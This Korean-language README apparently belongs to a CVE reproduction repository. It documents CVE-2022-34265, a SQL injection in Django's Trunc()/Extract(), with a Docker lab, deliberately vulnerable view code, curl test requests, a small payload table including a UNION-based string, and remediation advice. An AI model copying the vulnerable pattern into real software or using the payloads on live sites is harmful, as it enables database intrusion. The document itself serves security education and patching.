- **Django** — Python 기반 웹 프레임워크
    - [CVE-2022-34265](./Django/CVE-2022-34265/README.ko-kr.md) — Trunc()/Extract() SQL Injection
        - Contributor: [@woohyun212](https://github.com/woohyun212) | Risk Score: 9.8 (Reproducibility: 85%)
     
위 CVE 선택

# CVE-2022-34265 — Django Trunc()/Extract() SQL Injection

## 1. 취약점 요약

Django 4.0.6 미만 버전에서 발견된 SQL Injection 취약점입니다. 
`Trunc()`와 `Extract()` 함수에서 사용자 입력값이 충분히 검증되지 않아, 
쿼리 파라미터를 통해 SQL 명령어를 삽입할 수 있습니다.

| 항목 | 내용 |
|-----|------|
| **CVE ID** | CVE-2022-34265 |
| **영향 버전** | Django < 4.0.6, Django < 3.2.14 |
| **공개 날짜** | 2022년 7월 4일 |
| **CVSS Score** | 9.8 (높음) |
| **인증 필요** | 아니오 |
| **원격 악용** | 가능 |

---

## 2. 환경 구성

### 사용 기술
- **Python**: 3.9
- **Django**: 4.0.5 (취약 버전)
- **Database**: SQLite3
- **Docker**: 컨테이너화된 환경

### 빌드 및 실행

```bash
docker compose up -d --build
```

서버가 시작되면 http://localhost:8080 으로 접근 가능합니다.

#### 컨테이너 상태 확인

```bash
docker compose ps
```

![Docker Container Running](./images/1.png)

---

## 3. 취약 조건

이 취약점은 다음 조건에서 발생합니다:

1. **Trunc() 함수 사용**: 날짜 필드를 집계할 때 `Trunc()` 함수 사용
2. **사용자 입력 미검증**: 쿼리 파라미터로 받은 값을 직접 `Trunc()`에 전달
3. **동적 쿼리**: ORM이 동적으로 SQL을 생성할 때 입력값이 이스케이프되지 않음

### 취약한 코드 예시

```python
def index(request):
    # 사용자 입력을 직접 받음
    date_param = request.GET.get('date', 'minute')
    
    # 취약한 부분: date_param을 검증 없이 Trunc()에 전달
    results = User.objects.annotate(
        date=Trunc('date_joined', date_param)  # ← SQL Injection 가능
    ).values('date').count()
```

Django ORM이 위 코드를 SQL로 변환할 때, `date_param` 값을 필터링하지 않고 
그대로 SQL 쿼리에 삽입하게 됩니다.

---

## 4. 재현 절차

### 정상 요청 (올바른 파라미터)

쿼리 파라미터에 올바른 값을 전달합니다:

```bash
curl.exe "http://localhost:8080/?date=minute"
```

**결과**: `no such table: auth_user`
- SQL 구문은 정상 파싱됨 (Django가 쿼리를 올바르게 생성)
- 에러는 DB에 테이블이 없어서 발생 (DB 초기화 상태)

### SQL Injection 공격 (악의적인 파라미터)

쿼리 파라미터에 SQL 메타 문자를 삽입합니다:

```bash
curl.exe "http://localhost:8080/?date=xxxx'xxxx"
```

**결과 및 분석:**

![PoC Results - Normal vs SQL Injection](./images/2.png)

- 정상 요청 에러: `no such table: auth_user` (SQL 파싱 성공)
- SQL Injection 에러: `near "xxxx": syntax error` ← **이것이 Injection 증거!**

**차이 분석**:
- Step 1: SQL은 올바르게 파싱되었고 테이블만 없음
- Step 2: SQL 구문 자체가 깨짐 (syntax error) = 사용자 입력이 SQL에 직접 삽입됨

입력값의 따옴표(`'`)가 SQL 쿼리 구조를 파괴했고, 이것이 SQL Injection이 성공했다는 증거입니다.

---

## 5. PoC 코드

### urls.py

```python
from django.urls import path
from django.http import HttpResponse
from django.db.models.functions import Trunc
from django.contrib.auth.models import User

def index(request):
    # 사용자 입력 받음 (취약한 부분)
    date_param = request.GET.get('date', 'minute')
    
    try:
        # Trunc()에 사용자 입력을 직접 사용 → SQL Injection 가능
        results = User.objects.annotate(
            date=Trunc('date_joined', date_param)
        ).values('date').count()
        
        return HttpResponse(
            f"<h1>Query executed with date_param: {date_param}</h1>"
            f"<p>Total users: {results}</p>"
        )
    
    except Exception as e:
        # 에러 메시지를 그대로 표시 (본 환경은 교육용)
        return HttpResponse(
            f"<pre><h2>SQL Error (CVE-2022-34265 triggered):</h2>{str(e)}</pre>",
            status=500
        )

urlpatterns = [
    path('', index, name='index'),
]
```

### 공격 페이로드 예시

| 페이로드 | 설명 | 결과 |
|---------|------|------|
| `minute` | 정상 요청 | SQL 파싱 성공 (테이블 없음 에러) |
| `xxxx'xxxx` | SQL 메타 문자 삽입 | **Syntax Error** ✓ Injection 성공 |
| `day) UNION SELECT 1--` | UNION 기반 공격 | 데이터 유출 가능 |

---

## 6. 실행 결과

### 테스트 환경
- ✅ Docker 이미지 빌드 성공
- ✅ Django 4.0.5 서버 실행 중
- ✅ 포트 8080 바인딩 완료

### 테스트 결과 요약

**Test 1: 정상 쿼리**

GET http://localhost:8080/?date=minute
Response: no such table: auth_user

**Test 2: SQL Injection**

GET http://localhost:8080/?date=xxxx'xxxx
Response: near "xxxx": syntax error

**결론**: SQL Injection 취약점 재현 성공 ✓

---

## 7. 대응 방안

### 7.1 즉시 조치 (권장)

- **Django 4.0.6 이상으로 업그레이드**
- **Django 3.2.14 이상으로 업그레이드**

공식 Django 보안 릴리스를 통해 이 취약점이 패치되었습니다.

### 7.2 임시 방안 (업그레이드 불가능한 경우)

입력값을 화이트리스트로 검증:

```python
from django.http import HttpResponseBadRequest

# 허용된 값들만 정의
VALID_TRUNC_KINDS = ['year', 'month', 'day', 'hour', 'minute', 'second']

def index(request):
    date_param = request.GET.get('date', 'minute')
    
    # 입력값 검증 (화이트리스트 방식)
    if date_param not in VALID_TRUNC_KINDS:
        return HttpResponseBadRequest("Invalid date parameter")
    
    # 이제 안전함
    results = User.objects.annotate(
        date=Trunc('date_joined', date_param)
    ).values('date').count()
    
    return HttpResponse(f"Total users: {results}")
```

### 7.3 운영 환경 모니터링

- **WAF 규칙**: SQL 메타 문자 (`'`, `--`, `UNION` 등) 탐지
- **데이터베이스 로깅**: 비정상 쿼리 패턴 감시
- **입력 검증**: 모든 사용자 입력에 대한 화이트리스트 적용

---

## 참고 자료

- [Django 공식 보안 공지 (2022-07-04)](https://www.djangoproject.com/weblog/2022/jul/04/security-releases/)
- [Django GitHub 보안 커밋](https://github.com/django/django/commit/0dc9c016fadb71a067e5a42be30164e3f96c0492)
- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
